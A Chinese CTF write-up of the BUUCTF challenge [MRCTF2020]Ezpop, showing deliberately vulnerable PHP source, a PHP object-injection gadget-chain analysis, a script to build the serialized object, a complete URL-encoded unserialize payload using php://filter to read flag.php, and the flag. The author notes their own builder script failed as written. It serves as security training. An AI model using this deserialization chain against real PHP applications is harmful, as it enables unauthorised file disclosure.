# [MRCTF2020]Ezpop

[题目地址](https://buuoj.cn/challenges#[MRCTF2020]Ezpop)

这题有点难受。

```php
<?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
```

这题看着这么多类，其实静下心来分析一下就能出来了，加上[官方文档](https://www.php.net/manual/zh/language.oop5.magic.php)更不是问题了。要读取flag.php，肯定要通过Modifier里的append函数中的include来包含文件。append函数在__invoke中调用，`__invoke`当尝试以调用函数的方式调用一个对象时被自动调用，哪里把一个变量当成函数调用了呢？Test的`__get`，`$this->p`不确定，我们能将其设为Modifier，然后调用`__get`。当尝试读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用。这里没那么明显，但是就剩下个Show类没有用了，还能在哪里呢？

Show类的`__toString`中尝试获取`$this->str->source;`，跟Test的`__get`情况差不多，`$this->str`虽然确定了，但是str->source可没有。如果我们把str设置为Test——没有source属性的类——就能调用到Test的`__get`了。最后一步，`__toString`方法用于一个类被当成字符串时应怎样回应。通俗来讲，就是把一个类用作字符串时该返回什么。哪里有把类用作字符串的嫌疑？Show的`__construct`里的`echo 'Welcome to '.$this->source."<br>";`。如果`$this->source`还是Show本身，就会调用`__toString`了。写成PHP：

```php
<?php
//And Crack It!
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
    public function append($value){
        echo $value;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
$show=new Show('a');
$show->str=new Test();
$show->str->p=new Modifier();
$show2=new Show($show);
echo urlencode(serialize($show2));
```

这时候问题就来了，我天真的以为这个没问题，结果还是有问题。最后的echo根本就出不来字符串，前面直接报错：

- Recoverable fatal error:  Method Show::__toString() must return a string value in /home/main.php on line 18

不懂了。去看[wp](https://blog.csdn.net/qq_45555226/article/details/109808474)，不是我们思路差不多啊，怎么我就出不来呢？不管了，总之payload：

- http://8c996b67-0213-4d86-bc6e-8b0e797b8435.node4.buuoj.cn:81/?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A4%3A%22chen%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D

得到的结果base64解码就是flag。

## Flag
> flag{2a5f9d9c-336c-418d-9676-75f95efe97d8}